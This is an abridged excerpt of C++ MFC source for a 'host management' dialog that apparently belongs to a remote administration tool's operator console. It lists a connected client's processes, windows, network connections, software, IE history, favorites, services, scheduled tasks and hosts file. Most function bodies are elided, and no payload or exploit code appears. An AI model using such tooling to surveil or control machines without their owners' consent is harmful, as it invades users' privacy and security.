...
CMachineDlg::CMachineDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CXTPResizeDialog(CMachineDlg::IDD, pParent)
{
...
BEGIN_MESSAGE_MAP(CMachineDlg, CXTPResizeDialog)
...
BOOL CMachineDlg::OnInitDialog()
{
	...
	CString str;
	str.Format(_T("主机管理 \\\\%s "), m_pContext->szAddress);
	SetWindowText(str);
...
void CMachineDlg::OnReceive()
{
	...
	CString str;
	str.Format(_T("主机管理 \\\\ %s  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
...
void CMachineDlg::OnReceiveComplete()
{
	...
	{
		strMsgShow.Format(_T("可能没权限或者没记录"));
		PostMessage(WM_SHOW_MSG, 0, 0);
		return;
	}
...
void CMachineDlg::OnDblclkList(NMHDR* pNMHDR, LRESULT* pResult)
{
	...
	case 6:OpenInfoDlg(); break;
	case 7:OpenInfoDlg(); break;
...
void CMachineDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
	...
	switch (nID)
	{
	case 0:ShowProcessList_menu(); break;
	case 1:ShowWindowsList_menu(); break;
	case 2:ShowNetStateList_menu(); break;
	case 3:ShowSoftWareList_menu(); break;
	case 4:ShowIEHistoryList_menu(); break;
	case 5:ShowFavoritesUrlList_menu(); break;
	case 6:ShowServiceList_menu(); break; //32服务
	case 7:ShowServiceList_menu(); break; //驱动服务
	case 8:ShowTaskList_menu(); break;//计划
...
void CMachineDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
...
void CMachineDlg::ShowFavoritesUrlList()
{
	...
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 2; j++)
		{
			TCHAR* lpString = (TCHAR*)((char*)lpBuffer + dwOffset);
...
void CMachineDlg::ShowServiceList()
{
	...
	m_list.InsertColumn(1, _T("描述"), LVCFMT_LEFT, 170);
...
void CMachineDlg::ShowTaskList()
{
	...
	m_list.InsertColumn(1, _T("目录"), LVCFMT_LEFT, 350);
	...
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		...
		taskname = (TCHAR*)(lpBuffer + dwOffset);
		...
		dwOffset += lstrlen(taskname) * 2 + 2 +
			lstrlen(taskpath) * 2 + 2 +
			lstrlen(exepath) * 2 + 2 +
			lstrlen(status) * 2 + 2 + sizeof(DATE) * 2;
...
void CMachineDlg::ShowProcessList_menu()
{
	...
	case 700:
	{
		...
		while (pos)
		{
			...
			{
				strMsgShow.Format(_T("打开%s失败。"), dlg.Str_loacal.GetBuffer());
				PostMessage(WM_SHOW_MSG, 0, 0);
			}
			else
			{
	...
	case 103:
	{
		...
		if (IDOK == dlg->DoModal())
		{
			...
			if (lpBuffer)
			{
				...
				memcpy(lpBuffer + offset, dlg->m_ZhuoZhe.GetBuffer(), lstrlen(dlg->m_ZhuoZhe.GetBuffer()) * 2 + 2);
				offset += lstrlen(dlg->m_ZhuoZhe.GetBuffer()) * 2 + 2;

				memcpy(lpBuffer + offset, dlg->m_MiaoShu.GetBuffer(), lstrlen(dlg->m_MiaoShu.GetBuffer()) * 2 + 2);
				offset += lstrlen(dlg->m_MiaoShu.GetBuffer()) * 2 + 2;
...
void CMachineDlg::ShowHostsList_menu()
{
	...
	case 300:
	{
		...
		CFileDialog dlg(TRUE, _T("*.txt"), NULL, OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST | OFN_HIDEREADONLY, _T("图片文件(*.txt;*.txt)|*.txt;*.txt| All Files (*.*) |*.*||"), NULL);
...
CString CMachineDlg::oleTime2Str(double time)
{
	...
	else
	{
		...
		struct tm tm1;
		localtime_s(&tm1, &t);
		str.Format(_T("%04d-%02d-%02d %02d:%02d:%02d"), tm1.tm_year + 1900, tm1.tm_mon + 1, tm1.tm_mday, tm1.tm_hour, tm1.tm_min, tm1.tm_sec);
	}
	return str;
}